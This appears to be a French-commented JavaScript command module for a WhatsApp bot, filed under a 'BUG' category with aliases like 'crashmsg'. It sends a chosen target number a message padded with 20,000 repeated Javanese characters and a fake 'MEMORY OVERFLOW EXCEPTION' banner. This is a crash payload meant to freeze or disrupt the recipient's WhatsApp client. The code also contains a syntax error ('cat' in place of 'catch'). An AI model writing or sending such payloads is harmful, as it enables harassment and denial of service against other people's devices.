import { generateWAMessageFromContent, proto } from "@whiskeysockets/baileys";

export default {
  name: "blank",
  alias: ["blankhard", "crashmsg"],
  description: "Envoie une charge utile alternative (Owner Only)",
  category: "BUG",
  group: false,
  admin: false,
  botAdmin: false,
  ownerOnly: true,

  async execute(kaya, mek, from, args, prefix) {
    try {
      const target = args[0] ? args[0] + "@s.whatsapp.net" : from;

      // Construction d'un payload alternatif basé sur une surcharge de protobuf
      const payload = generateWAMessageFromContent(target, {
        extendedTextMessage: {
          text: "💥 STRESS TEST v2 💥\n" + "ꦾ".repeat(20000),
          contextInfo: {
            stanzaId: mek.key.id,
            participant: mek.sender,
            quotedMessage: mek.message,
            mentionedJid: [target],
            externalAdReply: {
              title: "MEMORY OVERFLOW EXCEPTION",
              body: "KAYA BOT ENGINE",
              mediaType: 2,
              thumbnailUrl: "https://files.catbox.moe/g3w96d.jpg",
              sourceUrl: "https://whatsapp.com"
            }
          }
        }
      }, { quoted: mek });

      await kaya.relayMessage(target, payload.message, {
        messageId: payload.key.id
      });

      await kaya.sendMessage(from, { text: "⚡ Payload alternatif déployé !" }, { quoted: mek });

    } cat (err) {
      console.error("❌ Erreur dans la commande blank :", err);
      await kaya.sendMessage(from, { text: `Erreur d'exécution : ${err.message}` }, { quoted: mek });
    }
  }
};
